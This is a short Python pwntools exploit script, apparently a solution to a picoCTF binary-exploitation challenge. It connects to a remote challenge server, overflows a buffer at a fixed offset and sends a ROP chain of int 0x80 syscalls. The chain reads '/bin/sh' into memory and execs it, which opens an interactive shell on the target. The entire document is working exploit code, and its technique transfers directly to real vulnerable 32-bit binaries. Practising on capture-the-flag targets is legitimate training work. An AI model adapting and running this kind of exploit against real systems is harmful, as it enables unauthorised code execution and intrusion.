from pwn import *
#context.log_level = "DEBUG"

#p = process("./vuln")
p = remote("saturn.picoctf.net", 56241)
elf = ELF("./vuln")
#gdb.attach(p, gdbscript="b *0x08049dc0")

# leak libc version
offset = 28
# gadgets
pop_eax = 0x080b073a #: pop eax; ret; syscall number
push_eax = 0x080b06da #: push eax; ret;
pop_ebx = 0x08049022#: pop ebx; ret;
pop_ecx = 0x08049e29 #: pop ecx; ret;
pop_edx_ebx = 0x080583b9 #: pop edx; pop ebx; ret;
int_0x80 = 0x08071640#: int 0x80; ret;

bin_sh = 0x80e62c0 # bss
payload = flat({offset: pop_eax},  # read syscall
               0x3,
               pop_ecx, bin_sh,
               pop_edx_ebx, 0x20, 0x0,
               int_0x80, # write syscall test
               pop_eax, 0x4,
               pop_ecx, bin_sh,
               pop_edx_ebx, 0x20, 0x1,
               int_0x80,
               pop_eax, 0x0b,
               pop_ecx, 0x0,
               pop_edx_ebx, 0x0, bin_sh,
               int_0x80)
# read /bin/sh, execuse bin/sh
p.recvline()
p.sendline(payload)
p.send(b"/bin/sh\x00")
p.interactive()
